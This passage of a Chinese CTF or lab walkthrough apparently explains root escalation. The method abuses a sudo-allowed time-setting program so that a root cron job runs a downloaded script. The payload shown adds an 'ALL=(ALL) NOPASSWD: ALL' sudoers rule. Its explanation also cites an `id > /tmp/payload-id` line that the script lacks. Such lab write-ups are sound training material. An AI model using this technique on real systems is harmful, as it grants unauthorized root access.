## root

现在要想办法拿到root的权限，首先查看当前用户有些什么权限

```bash
sudo -l
```

![[Pasted image 20261015152600.png]]

意思是：用户 `s1mpl3` 可以把 `/usr/local/sbin/settime` 这个程序以 root 权限运行，但不代表可以直接执行任意 root 命令。

`/usr/local/sbin/settime`的作用是以 root 权限运行 `settime` 程序，用来修改系统时间。

其使用格式为：`sudo /usr/local/sbin/settime 'YYYY-MM-DD HH:MM:SS'`

于是猜测这个为突破口，查看root的cron 任务：

```bash
cat /var/backups/crontab.bak
```

![[Pasted image 20261015153239.png]]

发现该root有一个定时任务是每年的8月8日访问一个网址并拉取到本地给shell，执行这个网页的内容

所以我们想要得到root权限需要：

1. 修改时间使得root执行这个任务
2. 想办法将`http://2060.dsz`解析指向kali

## payload构造

```bash
#!/bin/sh

RULE_FILE="/etc/sudoers.d/zz-s1mpl3"

printf '%s\n' 's1mpl3 ALL=(ALL) NOPASSWD: ALL' > "$RULE_FILE"
chown root:root "$RULE_FILE"
chmod 0440 "$RULE_FILE"

# 检查 sudo 配置，错误就删除，避免破坏 sudo
if ! visudo -c >/dev/null 2>&1; then
    rm -f "$RULE_FILE"
    exit 1
fi
```

更改时间，然后查看提权是否成功

```bash
sudo /usr/local/sbin/settime '2027-08-07 23:59:00'
sleep 70
cat /tmp/payload-id
sudo -n id
```

- `cat /tmp/payload-id`：读取 payload 留下的验证标记。payload 里有 `id > /tmp/payload-id`；root 的 cron 执行它时，`id` 的输出会被写进这个文件。如果内容是 `uid=0(root)`，说明 payload 至少有一条命令确实以 root 身份运行过。它是证据，不会提升当前 shell 的权限。
    
- `sudo -n id`：测试当前用户能否不输入密码就运行 root 命令。payload 写入 sudoers 规则 `s1mpl3 ALL=(ALL) NOPASSWD: ALL` 后，`sudo` 读取这条规则，允许 `s1mpl3` 免密码执行命令。`-n` 表示禁止交互式询问密码：规则有效时，`id` 以 root 身份运行并显示 `uid=0(root)`；规则无效时，它立即报错。
